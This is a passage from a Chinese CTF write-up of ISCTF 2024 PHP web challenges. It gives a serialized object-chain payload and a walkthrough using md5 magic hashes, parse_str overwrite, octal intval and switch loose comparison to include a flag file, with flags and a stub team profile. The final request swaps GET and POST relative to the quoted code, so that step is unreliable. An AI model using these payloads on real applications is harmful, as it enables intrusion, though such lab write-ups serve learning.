哦？又一个不信天命之人？行了，拿了东西速速离开吧
ISCTF{3b254833-b29f-4336-ad56-662ab769059f} 你真的逃出去了吗？天命人？
```

#### 题目答案

##### 核心payload

```shell
GET ?J=0e215962017
POST Wukong=O:11:"Tianmingren":2:{s:8:"tianming";O:15:"Dinghaishenzhen":2:{s:6:"Jindou";s:40:"一个筋斗能翻十万八千里！<br>";s:3:"yun";O:13:"Huoyanjinjing":2:{s:6:"huoyan";O:9:"Wuzhishan":3:{s:2:"wu";s:40:"俺老孙定要踏破这五指山！<br>";s:3:"zhi";N;s:4:"shan";N;}s:7:"jinjing";N;}}s:0:"ren";N;}
```

##### 获得答案

```shell
ISCTF{3b254833-b29f-4336-ad56-662ab769059f}
```



### 小蓝鲨的冒险

#### 题目信息

> ## 小蓝鲨的冒险295 pts
>
> 题目难度：**简单**
>
> 题目描述：php特性，你能让小蓝鲨通关吗？
>
> 出题人：fpclose
>
> 学校：大理大学

#### 解题过程

#####  查看题目

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$a = "isctf2024";
$b = $_GET["b"];
@parse_str($b);
echo "小蓝鲨开始闯关，你能帮助他拿到flag吗?<br>";
if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) {
    $num = $_POST["num"];
    echo "第一关有惊无险！小蓝鲨壮着胆子接着继续往下走！<br>";
    if($num == 2024){
        die("QAQ小蓝鲨误入陷阱，不怕，再接再厉！");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("陷阱太多QAQ");
    }
    if(intval($num,0) == 2024){
        echo "到这了难道还要放弃吗？<br>";
        if (isset($_GET['which'])){
            $which = $_GET['which'];
            echo "小蓝鲨貌似在哪里见过这个陷阱O.o?继续加油，还差最后一步了！";
            switch ($which){
                case 0:
                    print('QAQ');
                case 1:
                case 2:
                    require_once $which.'.php';
                    echo $flag;
                    break;
                default:
                    echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
                    break;
            }
        }
    }
}
```

##### 编写payload

```shell
b=a[0]=s878926199a
num=03750
which=flag
```

##### 发起攻击

```shell
GET ?b=a[0]=s878926199a&num=03750
POST which=flag
```

```shell
小蓝鲨开始闯关，你能帮助他拿到flag吗?
第一关有惊无险！小蓝鲨壮着胆子接着继续往下走！
到这了难道还要放弃吗？
小蓝鲨貌似在哪里见过这个陷阱O.o?继续加油，还差最后一步了！QAQISCTF{e77487a6-6724-4597-9e53-cb08804ad007}
```

#### 题目答案

##### 核心payload

```shell
GET ?b=a[0]=s878926199a&num=03750
POST which=flag
```

##### 获得答案

```shell
ISCTF{e77487a6-6724-4597-9e53-cb08804ad007}
```



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**